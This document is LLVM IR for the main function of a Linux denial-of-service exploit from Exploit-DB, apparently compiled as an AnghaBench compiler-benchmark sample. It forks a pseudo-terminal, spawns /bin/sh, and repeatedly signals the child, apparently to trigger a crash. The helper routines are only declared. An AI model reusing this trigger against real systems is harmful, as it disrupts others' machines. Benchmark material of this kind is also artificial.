; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_33193.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_33193.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.winsize = type { i32, i32, i64, i64 }

@.str = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@__const.main.args = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0), i8* null], align 16
@SIGINT = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.winsize, align 8
  %11 = alloca i32, align 4
  %12 = alloca [2 x i8*], align 16
  %13 = alloca [1 x i8*], align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = getelementptr inbounds %struct.winsize, %struct.winsize* %10, i32 0, i32 0
  store i32 80, i32* %14, align 8
  %15 = getelementptr inbounds %struct.winsize, %struct.winsize* %10, i32 0, i32 1
  store i32 25, i32* %15, align 4
  %16 = getelementptr inbounds %struct.winsize, %struct.winsize* %10, i32 0, i32 3
  store i64 0, i64* %16, align 8
  %17 = getelementptr inbounds %struct.winsize, %struct.winsize* %10, i32 0, i32 2
  store i64 0, i64* %17, align 8
  %18 = call i64 @forkpty(i32* %9, i32* null, i32* null, %struct.winsize* %10)
  store i64 %18, i64* %8, align 8
  %19 = load i64, i64* %8, align 8
  %20 = icmp eq i64 %19, 0
  br i1 %20, label %21, label %26

21:                                               ; preds = %3
  %22 = bitcast [2 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %22, i8* align 16 bitcast ([2 x i8*]* @__const.main.args to i8*), i64 16, i1 false)
  %23 = bitcast [1 x i8*]* %13 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %23, i8 0, i64 8, i1 false)
  %24 = call i32 (...) @process_cmds()
  %25 = call i32 @_exit(i32 1) #4
  unreachable

26:                                               ; preds = %3
  %27 = load i32, i32* %9, align 4
  %28 = call i32 @resync(i32 %27)
  store i32 0, i32* %11, align 4
  br label %29

29:                                               ; preds = %37, %26
  %30 = load i32, i32* %11, align 4
  %31 = icmp slt i32 %30, 10
  br i1 %31, label %32, label %40

32:                                               ; preds = %29
  %33 = call i32 @usleep(i32 100)
  %34 = load i64, i64* %8, align 8
  %35 = load i32, i32* @SIGINT, align 4
  %36 = call i32 @kill(i64 %34, i32 %35)
  br label %37

37:                                               ; preds = %32
  %38 = load i32, i32* %11, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %11, align 4
  br label %29

40:                                               ; preds = %29
  %41 = load i32, i32* %9, align 4
  %42 = call i32 @resync(i32 %41)
  ret i32 0
}

declare dso_local i64 @forkpty(i32*, i32*, i32*, %struct.winsize*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @process_cmds(...) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #3

declare dso_local i32 @resync(i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @kill(i64, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
